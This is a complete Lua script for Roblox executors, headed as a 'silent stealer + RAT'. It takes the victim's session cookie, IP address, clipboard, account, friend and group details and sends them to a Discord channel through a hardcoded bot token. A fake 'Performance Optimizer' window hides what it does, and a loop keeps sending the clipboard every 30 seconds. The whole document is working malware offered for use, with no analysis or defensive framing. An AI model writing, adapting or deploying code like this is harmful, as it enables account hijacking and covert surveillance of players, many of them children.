-- ============================================================
-- SILENT STEALER + RAT (Bot Token) – NO TEST
-- ============================================================
local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
local channelID = "1543230748180615198"

-- ========== HTTP SENDER ==========
local function sendMessage(content)
    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {
        ["Authorization"] = "Bot " .. botToken,
        ["Content-Type"] = "application/json"
    }
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== HELPERS ==========
local function safeGet(obj, prop, default)
    local ok, val = pcall(function() return obj[prop] end)
    return ok and val or default
end

local function getClip()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

-- ========== IP ==========
local function getIP()
    local ip = "N/A"
    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
            else ip = result:gsub("%s+", "") end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

-- ========== COOKIE (safe attempts) ==========
local function stealCookie()
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    ok, val = pcall(getrobloxcookie)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    return "Not available (executor limit)"
end

-- ========== COLLECT ALL DATA ==========
local function collectData()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
        info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
        info.totalFriends = tostring(#player:GetFriends() or 0)
        -- Groups
        local groups = {}
        local ok, grpData = pcall(function() return player:GetGroups() end)
        if ok and grpData then
            for _, g in ipairs(grpData) do
                table.insert(groups, g.Name .. "(" .. g.Role .. ")")
            end
        end
        info.groups = (#groups > 0) and table.concat(groups, ", ") or "None"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") then table.insert(items, item.Name) end
                end
                info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
            end
        end)
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
            end
        end)
    end
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
    info.universeId = tostring(safeGet(game, "UniverseId", "N/A"))
    info.rootPlaceId = tostring(safeGet(game, "RootPlaceId", "N/A"))
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.clientVersion = safeGet(game, "Version", "N/A")
    info.ip = getIP()
    info.cookie = stealCookie()
    info.clipboard = getClip()
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)
    return info
end

-- ========== SEND INITIAL DATA ==========
local function sendInitial()
    local data = collectData()
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("%s: %s", k, tostring(v)))
        end
    end
    local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
    sendMessage(msg)
end

-- ========== GUI ==========
local function createGUI()
    pcall(function()
        local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local gui = Instance.new("ScreenGui")
        gui.Parent = pg
        gui.ResetOnSpawn = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 420, 0, 180)
        f.Position = UDim2.new(0.5, -210, 0.5, -90)
        f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        f.BackgroundTransparency = 0.08
        f.Parent = gui
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 14)
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 45)
        t.Position = UDim2.new(0, 0, 0, 10)
        t.BackgroundTransparency = 1
        t.Text = "Performance Optimizer"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextScaled = true
        t.Font = Enum.Font.GothamBold
        t.Parent = f
        local s = Instance.new("TextLabel")
        s.Size = UDim2.new(1, 0, 0, 30)
        s.Position = UDim2.new(0, 0, 0.38, 0)
        s.BackgroundTransparency = 1
        s.Text = "Optimization complete!"
        s.TextColor3 = Color3.fromRGB(200, 200, 210)
        s.TextScaled = true
        s.Font = Enum.Font.Gotham
        s.Parent = f
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 100, 0, 35)
        btn.Position = UDim2.new(0.5, -50, 1, -45)
        btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        btn.Text = "CLOSE"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = f
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    end)
end

-- ========== START ==========
sendInitial()
createGUI()

-- ========== CONTINUOUS RAT LOOP (clipboard every 30s) ==========
while true do
    task.wait(30)
    local clip = getClip()
    if clip and clip ~= "N/A" and clip ~= "" then
        sendMessage("```[CLIPBOARD] " .. clip .. "```")
    end
end
